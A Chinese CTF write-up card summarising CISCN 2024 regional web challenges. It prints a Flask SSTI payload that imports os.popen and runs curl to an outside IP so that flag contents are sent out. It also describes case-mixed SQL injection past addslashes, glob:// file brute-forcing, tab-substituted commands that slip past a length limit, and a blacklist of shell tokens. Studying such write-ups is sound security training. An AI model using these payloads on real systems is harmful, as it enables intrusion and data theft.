---
title: "CISCN 华东北 2024 比赛题解"
category: web
tags: ["CISCN", "web", "狼组复盘", "SSTI禁print", "cycler.__globals__.__builtins__.__import__", "flask render_template_string"]
signals: ["CISCN 2024", "狼组复盘", "SSTI禁print", "cycler.__globals__.__builtins__.__import__", "flask render_template_string", "python-2 db flag", "php-1 后门注释", "php-2 union seLEct大小写", "php-3 glob协议爆破", "web_unknown", "CISCN", "SSTI", "print", "cycler"]
difficulty: medium
source: "https://www.ctfiot.com/190139.html"
tools: ["Python"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# CISCN 华东北 2024 比赛题解

> 赛事：CISCN 2024 | 方向：web | 难度：medium | 工具：Python

## 一句话总结

CISCN 华东北 2024 狼组复盘 — SSTI 禁 print 用 cycler.__globals__.__builtins__.__import__ 拿 os.popen + php-2 union seLEct 大小写 + php-3 glob 爆破 d88554c739859dfe + sort%09 12 字符限制读 /flag。

## 攻击链

1. python-1 SSTI 禁 print: cycler.next.__globals__.__builtins__.__import__(''os'')[''p''''open''](''cu''+''rl http://10.101.64.15:8081/`sort /fl*`'').read()
2. python-2: db 里就有 flag (非预期)
3. php-1: 后门 d 盾扫描 → 注释
4. php-2: union seLEct 大小写绕过 addslashes
5. php-3: glob:///var/www/html/d* 爆破 d88554c739859dfe.php
6. d88554c739859dfe.php 12 字符限制: sort%09/f* 绕 (空格 tab 替代)
7. blacklist: space/flag/cat/&&/||/%0a/less/more/%0d/|/& 替换空
8. sort%09 长度 9 < 12 字符

## 关键 payload

```
cycler SSTI 禁 print / union seLEct 大小写 / glob 协议爆破 d88554c739859dfe / sort%09 12 字符限制 / %09 代替空格
```

## 经验教训

SSTI 沙箱常禁 print 但 __globals__.__builtins__.__import__ 仍可绕;SQL 大小写绕过 addslashes;glob 协议 + 字符爆破是文件发现经典法;sort%09 替代 sort+空格节省字符。

## 标签

狼组复盘、SSTI禁print、cycler.__globals__.__builtins__.__import__、flask render_template_string、python-2 db flag、php-1 后门注释、php-2 union seLEct大小写、php-3 glob协议爆破、d88554c739859dfe.php、sort%09/f* 12字符绕过

## 参考来源

- https://www.ctfiot.com/190139.html
- 原文件：CISCN华东北_2024_比赛题解.full.md
